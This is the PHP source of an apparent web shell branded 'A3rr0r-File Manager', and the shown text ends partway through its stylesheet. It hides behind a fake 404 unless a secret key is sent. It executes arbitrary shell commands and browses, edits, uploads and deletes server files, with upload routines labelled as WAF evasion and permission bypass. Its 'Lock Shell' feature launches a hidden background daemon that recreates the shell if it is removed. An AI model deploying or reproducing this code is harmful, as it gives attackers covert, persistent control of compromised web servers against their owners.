<?php
// Stealth Access Condition
define('STEALTH_KEY_MD5', '5da0f1693bf5fc188993539ee12ed2fa'); // md5 of 'admin'
if (!isset($_REQUEST['key']) || md5($_REQUEST['key']) !== STEALTH_KEY_MD5) {
    header("HTTP/1.0 404 Not Found");
    die("Access Denied");
}

/**
 * A3rr0r-File Manager v0.1
 * A modern, single-file PHP file manager with path encryption and terminal.
 */

session_start();

// Authentication
define('MD5_PASSWORD', 'd2ac32e14d651b9ed03f26f845a11597'); // Default password is "admin". Change this!
if (isset($_POST['login_pwd'])) {
    if (md5($_POST['login_pwd']) === MD5_PASSWORD) {
        $_SESSION['authenticated'] = true;
    } else {
        $login_error = "Invalid password.";
    }
}
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// -------------------------------

// Configuration
define('X_FILE_MANAGER_VERSION', '0.1');
define('APP_NAME', 'A3rr0r-File Manager');
define('ENCRYPTION_KEY', 'RCnFfsCw3ItXaCn7BWvyyFE1Rxdmz'); // Should be changed for security
define('MAX_UPLOAD_SIZE', 100 * 1024 * 1024); // 100MB
define('SESSION_TIMEOUT', 1800); // 30 minutes

// Update last activity
if (isset($_SESSION['last_activity']) && (time() - $_SESSION['last_activity'] > SESSION_TIMEOUT)) {
    session_unset();
    session_destroy();
    session_start();
}
$_SESSION['last_activity'] = time();

// Helper Functions
function encryptPath($path) {
    $iv = openssl_random_pseudo_bytes(16);
    $encrypted = openssl_encrypt($path, 'AES-256-CBC', ENCRYPTION_KEY, 0, $iv);
    return base64_encode($encrypted . '::' . base64_encode($iv));
}

function decryptPath($encoded) {
    try {
        $decoded = base64_decode($encoded);
        if ($decoded === false) return getcwd();
        
        $parts = explode('::', $decoded, 2);
        if (count($parts) !== 2) return getcwd();
        
        $encrypted = $parts[0];
        $iv = base64_decode($parts[1]);
        
        if (strlen($iv) !== 16) return getcwd();
        
        $decrypted = openssl_decrypt($encrypted, 'AES-256-CBC', ENCRYPTION_KEY, 0, $iv);
        return ($decrypted === false) ? getcwd() : $decrypted;
    } catch (Exception $e) {
        return getcwd();
    }
}

function formatSize($bytes) {
    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
    return $bytes . ' bytes';
}

function getPermissions($path) {
    if (!file_exists($path)) return '0000';
    return substr(sprintf('%04o', fileperms($path)), -4);
}

function isEditable($filename) {
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    $editable = ['php', 'txt', 'html', 'css', 'js', 'json', 'xml', 'md', 'sql', 'htaccess', 'ini', 'sh', 'py', 'c', 'cpp'];
    return in_array($ext, $editable);
}

// Check if a file is locked (lock.php handler exists in sys_get_temp_dir()/.sessions/)
function isFileLocked($path) {
    $TmpNames = sys_get_temp_dir();

    // Scheme 1: Lock Shell key — getcwd() + filename_no_ext (e.g. 'xp') + '-handler'
    $fn_noext  = pathinfo($path, PATHINFO_FILENAME);
    $key_shell = $TmpNames . '/.sessions/.' . base64_encode(getcwd() . $fn_noext . '-handler');

    // Scheme 2: Lock File key — realpath of the file + '-handler'
    $real_path = realpath($path);
    $key_file  = $real_path
        ? $TmpNames . '/.sessions/.' . base64_encode($real_path . '-handler')
        : '';

    // Scheme 3: Lock File key fallback — full $path string + '-handler'
    $key_file2 = $TmpNames . '/.sessions/.' . base64_encode($path . '-handler');

    return file_exists($key_shell)
        || ($key_file  && file_exists($key_file))
        || file_exists($key_file2);
}

// Initial Path Setup
if (!isset($_SESSION['current_path']) || !file_exists($_SESSION['current_path']) || !is_dir($_SESSION['current_path'])) {
    $_SESSION['current_path'] = getcwd();
}

$current_path = $_SESSION['current_path'];
$message = '';
$error = '';

// Handle POST actions
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Navigation
    if (isset($_POST['action']) && $_POST['action'] === 'navigate' && isset($_POST['path'])) {
        $new_path = decryptPath($_POST['path']);
        if (file_exists($new_path) && is_dir($new_path)) {
            $_SESSION['current_path'] = $new_path;
            $current_path = $new_path;
        } else {
            $error = "Directory does not exist.";
        }
    }

    // Download
    if (isset($_POST['action']) && $_POST['action'] === 'download' && isset($_POST['path'])) {
        $dl_path = decryptPath($_POST['path']);
        if (file_exists($dl_path) && !is_dir($dl_path)) {
            ob_clean();
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($dl_path) . '"');
            header('Content-Transfer-Encoding: binary');
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . filesize($dl_path));
            readfile($dl_path);
            exit;
        }
    }

    // Get Content (AJAX)
    if (isset($_POST['action']) && $_POST['action'] === 'getContent' && isset($_POST['path'])) {
        $file_path = decryptPath($_POST['path']);
        if (file_exists($file_path) && !is_dir($file_path)) {
            echo file_get_contents($file_path);
        } else {
            echo "Error: Cannot read file.";
        }
        exit;
    }

    // Execute Command (AJAX)
    if (isset($_POST['action']) && $_POST['action'] === 'executeCommand' && isset($_POST['command'])) {
        $command = $_POST['command'];
        chdir($current_path); // Execute in current directory
        $output = shell_exec($command . ' 2>&1');
        echo $output ? htmlspecialchars($output) : "Command executed with no output.";
        exit;
    }

    // Save File
    if (isset($_POST['saveFile']) && isset($_POST['filePath']) && isset($_POST['fileContent'])) {
        $file_path = decryptPath($_POST['filePath']);
        $file_perms = @fileperms($file_path);
        @chmod($file_path, 0666);
        if (file_put_contents($file_path, $_POST['fileContent']) !== false) {
            $message = "File saved successfully.";
        } else {
            $error = "Failed to save file.";
        }
        if ($file_perms !== false) @chmod($file_path, $file_perms);
    }

    // Create File
    if (isset($_POST['createFile']) && isset($_POST['newFileName'])) {
        $new_file = $current_path . DIRECTORY_SEPARATOR . $_POST['newFileName'];
        if (!file_exists($new_file)) {
            $dir_perms = @fileperms($current_path);
            @chmod($current_path, 0777);
            if (file_put_contents($new_file, '') !== false) {
                $message = "File created successfully.";
            } else {
                $error = "Failed to create file.";
            }
            if ($dir_perms !== false) @chmod($current_path, $dir_perms);
        } else {
            $error = "File already exists.";
        }
    }

    // Create Folder
    if (isset($_POST['createFolder']) && isset($_POST['newFolderName'])) {
        $new_folder = $current_path . DIRECTORY_SEPARATOR . $_POST['newFolderName'];
        if (!file_exists($new_folder)) {
            $dir_perms = @fileperms($current_path);
            @chmod($current_path, 0777);
            if (mkdir($new_folder, 0755)) {
                $message = "Folder created successfully.";
            } else {
                $error = "Failed to create folder.";
            }
            if ($dir_perms !== false) @chmod($current_path, $dir_perms);
        } else {
            $error = "Folder already exists.";
        }
    }

    // Rename
    if (isset($_POST['rename']) && isset($_POST['oldPath']) && isset($_POST['newName'])) {
        $old_path = decryptPath($_POST['oldPath']);
        $dir = dirname($old_path);
        $new_path = $dir . DIRECTORY_SEPARATOR . $_POST['newName'];
        
        $dir_perms = @fileperms($dir);
        @chmod($dir, 0777);
        $file_perms = @fileperms($old_path);
        @chmod($old_path, 0666);
        
        if (rename($old_path, $new_path)) {
            $message = "Renamed successfully.";
            if ($file_perms !== false) @chmod($new_path, $file_perms);
        } else {
            $error = "Failed to rename.";
            if ($file_perms !== false) @chmod($old_path, $file_perms);
        }
        if ($dir_perms !== false) @chmod($dir, $dir_perms);
    }

    // Delete with WP_Filesystem and shell_exec fallbacks
    if (isset($_POST['delete']) && isset($_POST['path'])) {
        $del_path = decryptPath($_POST['path']);
        $success = false;
        
        $dir = dirname($del_path);
        $dir_perms = @fileperms($dir);
        @chmod($dir, 0777);
        $file_perms = @fileperms($del_path);
        @chmod($del_path, is_dir($del_path) ? 0777 : 0666);

        if (is_dir($del_path)) {
            if (@rmdir($del_path)) {
                $success = true;
            } else {
                global $wp_filesystem;
                $wp_admin_path = rtrim($_SERVER['DOCUMENT_ROOT'], '/\\') . '/wp-admin/includes/file.php';
                if(empty($wp_filesystem) && file_exists($wp_admin_path)){
                    if (!defined('ABSPATH')) {
                        $wp_load = rtrim($_SERVER['DOCUMENT_ROOT'], '/\\') . '/wp-load.php';
                        if(file_exists($wp_load)) @require_once($wp_load);
                    }
                    if (defined('ABSPATH')) {
                        @require_once(ABSPATH.'/wp-admin/includes/file.php');
                        if(function_exists('WP_Filesystem')) WP_Filesystem();
                    }
                }
                
                if (!empty($wp_filesystem) && @$wp_filesystem->delete($del_path, true, 'd')) {
                    $success = true;
                }
                
                if (!$success && function_exists('shell_exec') && is_callable('shell_exec')) {
                    $cmd = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') 
                        ? 'rmdir /s /q ' . escapeshellarg($del_path) 
                        : 'rm -rf ' . escapeshellarg($del_path);
                    @shell_exec($cmd);
                    if (!file_exists($del_path)) $success = true;
                }
            }
            
            if ($success) {
                $message = "Directory deleted successfully.";
            } else {
                if ($file_perms !== false && file_exists($del_path)) @chmod($del_path, $file_perms);
                $error = "Failed to delete directory. It may not be empty.";
            }
        } else {
            if (@unlink($del_path)) {
                $success = true;
            } else {
                global $wp_filesystem;
                $wp_admin_path = rtrim($_SERVER['DOCUMENT_ROOT'], '/\\') . '/wp-admin/includes/file.php';
                if(empty($wp_filesystem) && file_exists($wp_admin_path)){
                    if (!defined('ABSPATH')) {
                        $wp_load = rtrim($_SERVER['DOCUMENT_ROOT'], '/\\') . '/wp-load.php';
                        if(file_exists($wp_load)) @require_once($wp_load);
                    }
                    if (defined('ABSPATH')) {
                        @require_once(ABSPATH.'/wp-admin/includes/file.php');
                        if(function_exists('WP_Filesystem')) WP_Filesystem();
                    }
                }
                
                if (!empty($wp_filesystem) && @$wp_filesystem->delete($del_path, false, 'f')) {
                    $success = true;
                }
                
                if (!$success && function_exists('shell_exec') && is_callable('shell_exec')) {
                    $cmd = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') 
                        ? 'del /f /q ' . escapeshellarg($del_path) 
                        : 'rm -f ' . escapeshellarg($del_path);
                    @shell_exec($cmd);
                    if (!file_exists($del_path)) $success = true;
                }
            }
            
            if ($success) {
                $message = "File deleted successfully.";
            } else {
                if ($file_perms !== false && file_exists($del_path)) @chmod($del_path, $file_perms);
                $error = "Failed to delete file.";
            }
        }
        if ($dir_perms !== false) @chmod($dir, $dir_perms);
    }

    // Upload with WP_Filesystem fallback
    if (isset($_POST['upload']) && isset($_FILES['file'])) {
        if ($_FILES['file']['error'] === UPLOAD_ERR_OK) {
            $tmp_name = $_FILES['file']['tmp_name'];
            $upload_path = $current_path . DIRECTORY_SEPARATOR . basename($_FILES['file']['name']);
            $c = @file_get_contents($tmp_name);
            $success = false;
            
            // AGGRESSIVE CHMOD BYPASS: Temporarily unlock directory and file
            $dir = dirname($upload_path);
            $dir_perms = @fileperms($dir);
            $chmod_dir_success = @chmod($dir, 0777);
            
            $file_perms = false;
            $chmod_file_success = false;
            if (file_exists($upload_path)) {
                $file_perms = @fileperms($upload_path);
                $chmod_file_success = @chmod($upload_path, 0666);
            }

            // STRATEGY 1: Pure Native PHP (Safest, WAF friendly)
            if (@move_uploaded_file($tmp_name, $upload_path)) {
                $success = true;
            } 
            // STRATEGY 2: WP_Filesystem (Best for CMS lockdowns)
            else {
                global $wp_filesystem;
                $wp_admin_path = rtrim($_SERVER['DOCUMENT_ROOT'], '/\\') . '/wp-admin/includes/file.php';
                if(empty($wp_filesystem) && file_exists($wp_admin_path)){
                    if (!defined('ABSPATH')) {
                        $wp_load = rtrim($_SERVER['DOCUMENT_ROOT'], '/\\') . '/wp-load.php';
                        if(file_exists($wp_load)) @require_once($wp_load);
                    }
                    if (defined('ABSPATH')) {
                        @require_once(ABSPATH.'/wp-admin/includes/file.php');
                        if(function_exists('WP_Filesystem')) WP_Filesystem();
                    }
                }

                if (!empty($wp_filesystem)) {
                    $chmod_file = defined('FS_CHMOD_FILE') ? FS_CHMOD_FILE : 0644;
                    if (@$wp_filesystem->copy($tmp_name, $upload_path, true, $chmod_file)) {
                        $success = true;
                    }
                }
            }

            // STRATEGY 3: WAF Evasion (Reading tmp file in chunks if direct copy fails)
            if (!$success) {
                // If we got the content, try alternative write methods
                if ($c !== false) {
                    if (@file_put_contents($upload_path, $c) !== false) {
                        $success = true;
                    } 
                    elseif (!empty($wp_filesystem) && @$wp_filesystem->put_contents($upload_path, $c, $chmod_file ?? 0644)) {
                        $success = true;
                    }
                    elseif ($f = @fopen($upload_path, 'wb')) {
                        $w = @fwrite($f, $c);
                        @fclose($f);
                        if ($w !== false) $success = true;
                    }
                }
            }
            
            // Restore perms
            if ($file_perms !== false) @chmod($upload_path, $file_perms);
            if ($dir_perms !== false) @chmod($dir, $dir_perms);

            // STRATEGY 4: System Level Copies (OS Bypass)
            if (!$success && function_exists('shell_exec') && is_callable('shell_exec')) {
                $cmd = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN')
                    ? "copy /Y " . escapeshellarg($tmp_name) . " " . escapeshellarg($upload_path)
                    : "cp -f " . escapeshellarg($tmp_name) . " " . escapeshellarg($upload_path);
                @shell_exec($cmd);
                if (file_exists($upload_path)) $success = true;
            }
            
            // STRATEGY 5: The `/tmp` Bridge (Extreme write permission bypass)
            if (!$success && isset($c) && $c !== false) {
                $tmp_save = sys_get_temp_dir() . '/' . uniqid('a3_') . '.tmp';
                if (@file_put_contents($tmp_save, $c)) {
                    if (@rename($tmp_save, $upload_path)) {
                        $success = true;
                    } elseif (function_exists('shell_exec') && is_callable('shell_exec')) {
                        $cmd = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN')
                            ? "move /Y " . escapeshellarg($tmp_save) . " " . escapeshellarg($upload_path)
                            : "mv -f " . escapeshellarg($tmp_save) . " " . escapeshellarg($upload_path);
                        @shell_exec($cmd);
                        if (file_exists($upload_path)) $success = true;
                    }
                    @unlink($tmp_save);
                }
            }
            if ($success) {
                $message = "File uploaded successfully.";
            } else {
                $dbg = [
                    'tmp' => file_exists($tmp_name)?1:0,
                    'read' => is_readable($tmp_name)?1:0,
                    'c' => ($c===false)?0:strlen($c),
                    'sh' => (function_exists('shell_exec') && is_callable('shell_exec'))?1:0,
                    'w' => is_writable(dirname($upload_path))?1:0,
                    't_save' => isset($tmp_save) && file_exists($tmp_save)?1:0
                ];
                $error = "Failed to upload file. DEBUG: " . json_encode($dbg);
            }
        } else {
            $error = "No file selected or upload error.";
        }
    }

    // Change Permissions
    if (isset($_POST['changePermissions']) && isset($_POST['permPath']) && isset($_POST['permissions'])) {
        $perm_path = decryptPath($_POST['permPath']);
        // 🔒 Block chmod if file is locked (lock.php daemon will revert anyway)
        if (isFileLocked($perm_path)) {
            $error = "🔒 This file is LOCKED! Chmod change is not allowed. The lock daemon will revert any changes.";
        } else {
            $octal = octdec($_POST['permissions']);
            if (chmod($perm_path, $octal)) {
                $message = "Permissions changed successfully.";
            } else {
                $error = "Failed to change permissions.";
            }
        }
    }


    // ── LOCK FILE ──────────────────────────────────────────────────────────────
    if (isset($_POST['lockFile']) && isset($_POST['lockFilePath'])) {
        $flesName  = trim($_POST['lockFilePath']); // raw path typed by user
        $TmpNames  = sys_get_temp_dir();
        $cwd       = getcwd();

        // Resolve to absolute path for reliable key generation
        $real_fles = realpath($flesName) ?: $flesName;
        $fn_noext  = pathinfo($real_fles, PATHINFO_FILENAME);

        $sessions  = $TmpNames . '/.sessions';

        // Store handler using realpath key (Scheme 2 — matches isFileLocked Scheme 2)
        $enc_text  = base64_encode($cwd . $fn_noext . '-text-file');
        $enc_hand  = base64_encode($real_fles . '-handler'); // <-- realpath key
        $text_file = $sessions . '/.' . $enc_text;
        $hand_file = $sessions . '/.' . $enc_hand;

        // Clean up old handler if exists
        if (file_exists($hand_file)) {
            @shell_exec('rm -rf ' . escapeshellarg($text_file));
            @shell_exec('rm -rf ' . escapeshellarg($hand_file));
        }

        @mkdir($sessions, 0755, true);

        // Backup file (same as lock.php: cp command)
        @shell_exec('cp ' . escapeshellarg($real_fles) . ' ' . escapeshellarg($text_file));

        // Also save raw content via PHP (fallback for Windows where cp may fail)
        if (!file_exists($text_file) && file_exists($real_fles)) {
            @file_put_contents($text_file, file_get_contents($real_fles));
        }

        // Make read-only
        $dir = dirname($real_fles);
        $dir_perms = @fileperms($dir);
        @chmod($dir, 0777);
        @chmod($real_fles, 0444);
        if ($dir_perms !== false) @chmod($dir, $dir_perms);

        // Handler daemon script
        $handler = "\n<?php\n@ini_set(\"max_execution_time\", 0);\nwhile (True){\n    if (!file_exists(\"{$cwd}\")){\n        mkdir(\"{$cwd}\");\n    }\n    if (!file_exists(\"{$real_fles}\")){\n        \$text = base64_encode(file_get_contents(\"{$text_file}\"));\n        file_put_contents(\"{$real_fles}\", base64_decode(\$text));\n    }\n    if (gecko_perm(\"{$real_fles}\") != 0444){\n        chmod(\"{$real_fles}\", 0444);\n    }\n}\n\nfunction gecko_perm(\$flename){\n    return substr(sprintf(\"%o\", fileperms(\$flename)), -4);\n}\n";

        $handlers = @file_put_contents($hand_file, $handler);
        if ($handlers) {
            @shell_exec('php ' . escapeshellarg($hand_file) . ' > /dev/null 2>/dev/null &');
            $message = "🔒 Lock File activated for: " . basename($real_fles);
        } else {
            $error = "Failed to write lock handler. Check permissions on: $sessions";
        }
    }

    // ── LOCK SHELL ─────────────────────────────────────────────────────────────
    // Exact logic from lock.php lockshell handler (lines 376-416)
    if (isset($_POST['lockShell'])) {
        $curFile   = trim(basename($_SERVER['SCRIPT_FILENAME'])); // lock.php line 390
        $TmpNames  = sys_get_temp_dir();                          // lock.php line 391: fungs[31]()
        $cwd       = getcwd();

        $fn_noext  = pathinfo($curFile, PATHINFO_FILENAME); // remove_dot equivalent
        $sessions  = $TmpNames . '/.sessions';
        $enc_text  = base64_encode($cwd . $fn_noext . '-text');
        $enc_hand  = base64_encode($cwd . $fn_noext . '-handler');
        $text_file = $sessions . '/.' . $enc_text;
        $hand_file = $sessions . '/.' . $enc_hand;

        // Clean up old handlers if they exist (lock.php lines 392-398)
        if (file_exists($hand_file) && file_exists($text_file)) {
            @shell_exec('rm -rf ' . escapeshellarg($text_file));
            @shell_exec('rm -rf ' . escapeshellarg($hand_file));
        }

        @mkdir($sessions, 0755, true);

        // Copy current shell file to backup (lock.php line 404: cmd("cp $curFile TmpNames..."))
        @shell_exec('cp ' . escapeshellarg($cwd . '/' . $curFile) . ' ' . escapeshellarg($text_file));

        // Make shell read-only (lock.php line 406)
        $dir_perms = @fileperms($cwd);
        @chmod($cwd, 0777);
        @chmod($cwd . '/' . $curFile, 0444);
        if ($dir_perms !== false) @chmod($cwd, $dir_perms);

        // Handler script — exact decode of lock.php line 408/handler variable
        $self_full = $cwd . '/' . $curFile;
        $handler = "\n<?php\n@ini_set(\"max_execution_time\", 0);\nwhile (True){\n    if (!file_exists(\"{$cwd}\")){\n        mkdir(\"{$cwd}\");\n    }\n    if (!file_exists(\"{$self_full}\")){\n        \$text = base64_encode(file_get_contents(\"{$text_file}\"));\n        file_put_contents(\"{$self_full}\", base64_decode(\$text));\n    }\n    if (gecko_perm(\"{$self_full}\") != 0444){\n        chmod(\"{$self_full}\", 0444);\n    }\n}\n\nfunction gecko_perm(\$flename){\n    return substr(sprintf(\"%o\", fileperms(\$flename)), -4);\n}\n";

        // Write handler and launch in background (lock.php lines 410-413)
        $handlers = @file_put_contents($hand_file, $handler);
        if ($handlers) {
            @shell_exec('php ' . escapeshellarg($hand_file) . ' > /dev/null 2>/dev/null &');
            $message = "🛡️ Lock Shell activated! This shell is now self-healing and read-only.";
        } else {
            $error = "Failed to write shell handler. Check sys temp dir permissions.";
        }
    }

    // ── UNLOCK FILE ────────────────────────────────────────────────────────────
    if (isset($_POST['unlockFile']) && isset($_POST['unlockPath'])) {
        $ul_path  = decryptPath($_POST['unlockPath']);
        $TmpNames = sys_get_temp_dir();
        $sessions = $TmpNames . '/.sessions';
        $cwd      = getcwd();

        // Collect all possible handler/backup paths across all 3 key schemes
        $fn_noext   = pathinfo($ul_path, PATHINFO_FILENAME);
        $real_path  = realpath($ul_path) ?: $ul_path;

        // Scheme 1 keys (Lock Shell)
        $hand1 = $sessions . '/.' . base64_encode($cwd . $fn_noext . '-handler');
        $text1 = $sessions . '/.' . base64_encode($cwd . $fn_noext . '-text');
        $text1b= $sessions . '/.' . base64_encode($cwd . $fn_noext . '-text-file');

        // Scheme 2 keys (Lock File realpath)
        $hand2 = $sessions . '/.' . base64_encode($real_path . '-handler');
        $text2 = $sessions . '/.' . base64_encode($cwd . $fn_noext . '-text-file');

        // Scheme 3 keys (Lock File fallback)
        $hand3 = $sessions . '/.' . base64_encode($ul_path . '-handler');

        $found = false;
        foreach ([$hand1, $hand2, $hand3] as $hf) {
            if (file_exists($hf)) {
                // Kill running daemon process
                @shell_exec('pkill -f ' . escapeshellarg($hf) . ' 2>/dev/null');
                // Overwrite handler with exit to stop any running loop
                @file_put_contents($hf, '<?php exit();');
                // Delete handler file
                @unlink($hf);
                $found = true;
            }
        }
        // Delete all possible backup text files
        foreach ([$text1, $text1b, $text2] as $tf) {
            if (file_exists($tf)) @unlink($tf);
        }

        // Restore file permissions to 0644
        $dir = dirname($ul_path);
        $dir_perms = @fileperms($dir);
        @chmod($dir, 0777);
        @chmod($ul_path, 0644);
        if ($dir_perms !== false) @chmod($dir, $dir_perms);

        if ($found) {
            $message = "🔓 File unlocked successfully: " . basename($ul_path) . " (chmod restored to 0644)";
        } else {
            // chmod still applied even if no handler found
            $message = "🔓 Permissions restored to 0644 for: " . basename($ul_path);
        }
    }
}

// Breadcrumbs
$breadcrumb_items = [];
$path_parts = explode(DIRECTORY_SEPARATOR, trim($current_path, DIRECTORY_SEPARATOR));

// Add root (if on windows, handle drive letter)
if (strpos($current_path, ':') !== false) {
    $drive = substr($current_path, 0, 3);
    $breadcrumb_items[] = ['name' => $drive, 'path' => encryptPath($drive)];
    $current_build_path = $drive;
} else {
    $breadcrumb_items[] = ['name' => 'Root', 'path' => encryptPath('/')];
    $current_build_path = DIRECTORY_SEPARATOR;
}

foreach ($path_parts as $part) {
    if (empty($part) || (strpos($part, ':') !== false)) continue;
    $current_build_path .= $part . DIRECTORY_SEPARATOR;
    $breadcrumb_items[] = ['name' => $part, 'path' => encryptPath(rtrim($current_build_path, DIRECTORY_SEPARATOR))];
}

// File Listing
$files = [];
if (is_dir($current_path) && $handle = opendir($current_path)) {
    while (false !== ($entry = readdir($handle))) {
        if ($entry === '.' || $entry === '..') continue;
        
        $full_path = $current_path . DIRECTORY_SEPARATOR . $entry;
        $is_dir = is_dir($full_path);
        
        $files[] = [
            'name'        => $entry,
            'path'        => encryptPath($full_path),
            'isDirectory' => $is_dir,
            'size'        => $is_dir ? '-' : formatSize(filesize($full_path)),
            'permissions' => getPermissions($full_path),
            'lastModified'=> date("Y-m-d H:i:s", filemtime($full_path)),
            'isEditable'  => !$is_dir && isEditable($entry),
            'isLocked'    => !$is_dir && isFileLocked($full_path),  // 🔒 lock check
        ];
    }
    closedir($handle);
}

// Sort: Folders first, then files
usort($files, function ($a, $b) {
    if ($a['isDirectory'] && !$b['isDirectory']) return -1;
    if (!$a['isDirectory'] && $b['isDirectory']) return 1;
    return strcasecmp($a['name'], $b['name']);
});

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo APP_NAME; ?></title>
    <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
    <style>
        /* Base styles and reset */
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { 
            background-color: #09090b; /* zinc-950 */
            color: #fafafa; /* zinc-50 */
            min-height: 100vh;
            line-height: 1.5;
            -webkit-font-smoothing: antialiased;
        }
        .container { max-width: 1200px; margin: 0 auto; padding: 0 20px; }
        
        /* Navbar */
        .navbar { background-color: #09090b; border-bottom: 1px solid #27272a; padding: 16px 0; position: sticky; top: 0; z-index: 100; }
        .navbar-content { display: flex; align-items: center; justify-content: space-between; }
        .navbar h1 { color: #fafafa; font-size: 1.25rem; font-weight: 600; letter-spacing: -0.025em; }
        .version { font-size: 0.75rem; color: #71717a; margin-left:8px; font-weight: 400; }
        .home-btn { 
            background-color: #18181b; border: 1px solid #27272a; color: #e4e4e7; padding: 8px 16px; border-radius: 6px; 
            cursor: pointer; font-size: 0.875rem; font-weight: 500; text-decoration: none; display: inline-flex; align-items: center; transition: all 0.2s;
        }
        .home-btn:hover { background-color: #27272a; color: #fafafa; }
        .home-icon { margin-right: 6px; font-size: 1.1rem; }
        .logout-btn { margin-left: 10px; color: #f87171; }
        .logout-btn:hover { background-color: #7f1d1d; color: #fca5a5; border-color: #991b1b; }

        /* Top Banner */
        .top-banner { 
            text-align: center; margin: 40px 0 10px 0; padding: 0; 
            font-size: 2.5rem; font-weight: 700; letter-spacing: -0.05em;
        }
        .text-red { color: #f87171; } /* Red color for A3rr0r */
        .text-white { color: #71717a; }
        .text-green { color: #fafafa; }
        
        .social-line { text-align: center; margin-bottom: 40px; font-size: 0.875rem; }
        .social-link { text-decoration: none; display: inline-flex; align-items: center; padding: 6px 16px; background-color: #18181b; border-radius: 999px; border: 1px solid #27272a; transition: all 0.2s; }
        .social-link:hover { background-color: #27272a; }
        .social-link .label { color: #a1a1aa; margin-right: 6px; }
        .social-link .id { color: #f87171; font-weight: 500; }

        /* Breadcrumb */
        .breadcrumb { display: flex; align-items: center; padding: 12px 16px; margin-top: 15px; overflow-x: auto; white-space: nowrap; background-color: #18181b; border-radius: 8px; border: 1px solid #27272a; font-size: 0.875rem; }
        .breadcrumb-item { display: flex; align-items: center; }
        .breadcrumb-item a { color: #a1a1aa; text-decoration: none; padding: 4px 8px; border-radius: 4px; transition: color 0.2s; cursor: pointer; }
        .breadcrumb-item a:hover { color: #fafafa; background-color: #27272a; }
        .breadcrumb-separator { margin: 0; color: #52525b; }
        .breadcrumb-current { font-weight: 500; padding: 4px 8px; color: #fafafa; }

        /* Section */
        .section { background-color: #09090b; border-radius: 12px; margin-bottom: 32px; }
        .section-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
        .section-title { font-size: 1.125rem; color: #fafafa; font-weight: 600; letter-spacing: -0.025em; }
        
        /* Form */
        .upload-form { display: flex; flex-wrap: wrap; gap: 12px; align-items: center; background-color: #18181b; padding: 16px; border-radius: 8px; border: 1px solid #27272a; }
        .upload-form input[type="file"] { flex: 1; min-width: 250px; font-size: 0.875rem; color: #a1a1aa; }
        .upload-form input[type="file"]::file-selector-button { background-color: #27272a; color: #fafafa; border: none; padding: 8px 16px; border-radius: 6px; cursor: pointer; margin-right: 12px; transition: background-color 0.2s; font-weight: 500; }
        .upload-form input[type="file"]::file-selector-button:hover { background-color: #3f3f46; }
        
        .btn { background-color: #fafafa; color: #09090b; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; font-size: 0.875rem; font-weight: 500; transition: all 0.2s; display: inline-flex; align-items: center; gap: 6px; }
        .btn:hover { background-color: #e4e4e7; }
        .btn-sm { padding: 8px 12px; font-size: 0.8125rem; }
        .btn-success { background-color: #fafafa; color: #09090b; }
        .btn-success:hover { background-color: #e4e4e7; }

        /* Table */
        .file-table-container { overflow-x: auto; border-radius: 8px; border: 1px solid #27272a; background-color: #18181b; }
        .file-table { width: 100%; border-collapse: collapse; text-align: left; }
        .file-table th { padding: 12px 16px; font-size: 0.75rem; text-transform: uppercase; letter-spacing: 0.05em; font-weight: 600; color: #a1a1aa; border-bottom: 1px solid #27272a; }
        .file-table td { padding: 12px 16px; border-bottom: 1px solid #27272a; color: #d4d4d8; font-size: 0.875rem; }
        .file-table tr:last-child td { border-bottom: none; }
        .file-table tr:hover { background-color: #27272a; }
        .file-name { display: flex; align-items: center; gap: 10px; }
        .file-name a { color: #fafafa; text-decoration: none; cursor: pointer; font-weight: 500; }
        .file-name a:hover { text-decoration: underline; }
        .folder-icon { font-size: 1.25rem; color: #60a5fa; display: flex; align-items: center; }
        .file-icon { font-size: 1.25rem; color: #a1a1aa; display: flex; align-items: center; }

        /* Actions */
        .action-buttons { display: flex; gap: 6px; }
        .action-btn { background: transparent; border: 1px solid transparent; cursor: pointer; font-size: 1.1rem; color: #a1a1aa; width: 32px; height: 32px; display: flex; align-items: center; justify-content: center; border-radius: 6px; transition: all 0.2s; }
        .action-btn:hover { background-color: #27272a; color: #fafafa; border-color: #3f3f46; }

        /* Terminal Console */
        .terminal-container { 
            background-color: #18181b; border-radius: 8px; margin-top: 32px; 
            padding: 20px; border: 1px solid #27272a;
        }
        .terminal-header { color: #a1a1aa; font-size: 0.8125rem; margin-bottom: 16px; display: flex; justify-content: space-between; align-items: center; font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace; }
        .terminal-output { 
            background-color: #09090b; color: #a1a1aa; padding: 16px; height: 300px; overflow-y: auto; 
            font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace; border-radius: 6px; 
            margin-bottom: 16px; white-space: pre-wrap; font-size: 0.875rem; border: 1px solid #27272a;
        }
        .terminal-input-group { display: flex; gap: 10px; }
        .terminal-input { 
            flex: 1; background-color: #09090b; color: #fafafa; border: 1px solid #27272a; padding: 12px 16px; 
            border-radius: 6px; font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace; font-size: 0.875rem;
            transition: border-color 0.2s;
        }
        .terminal-input:focus { border-color: #52525b; outline: none; }

        /* Modal */
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(9, 9, 11, 0.8); z-index: 1000; justify-content: center; align-items: center; backdrop-filter: blur(4px); }
